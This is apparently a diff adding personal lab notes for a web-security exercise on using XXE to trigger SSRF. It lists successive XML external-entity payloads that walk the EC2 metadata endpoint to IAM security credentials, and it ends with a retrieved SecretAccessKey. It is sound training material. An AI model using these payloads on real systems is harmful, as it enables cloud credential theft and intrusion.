@@ -1,0 +1,26 @@
+Lab #2: Exploiting XXE to perform SSRF attacks
+
+End goal: 
+- exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint
+
+Analysis:
+
+1. Insert external entity betweeb the XML declaration and stockCheck
+
+<!DOCRTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
+
+productID --> &xxe;
+
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/">]>
+
+
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data">]>
+
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam">]>
+
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials">]>
+
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
+
+
+==>  "SecretAccessKey" : "VVKlMe7OPZT4nHQRjWbQs7P3uUecLAqZGfx41gxM"
